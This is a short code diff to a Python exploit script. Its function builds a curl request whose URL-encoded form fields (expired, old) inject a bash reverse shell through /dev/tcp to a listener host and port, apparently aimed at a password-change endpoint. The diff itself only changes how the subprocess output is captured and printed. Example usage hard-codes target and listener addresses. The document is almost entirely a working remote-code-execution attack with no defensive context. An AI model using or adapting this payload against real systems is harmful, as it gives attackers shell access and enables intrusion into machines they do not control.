@@ -9,7 +9,11 @@ def exploit(target, lhost, lport):
         "-H 'Content-Type: application/x-www-form-urlencoded' "
         f"-d 'expired=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27&new1=SmKUYgMFtixFlLt6nggby&new2=SmKUYgMFtixFlLt6nggby&old=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27'"
     )
-    subprocess.run(exploit_cmd, shell=True)
+    exploit_target = subprocess.run(
+        exploit_cmd, shell=True, capture_output=True, text=True
+    )
+    print(exploit_target.stdout)
+    print("Exploit script executed successfully.")
 
 # Example usage:
 target = "192.168.1.14"
@@ -17,4 +21,3 @@ lhost = "192.168.1.72"
 lport = "4443"
 
 exploit(target, lhost, lport)
-print("Exploit script executed successfully.")
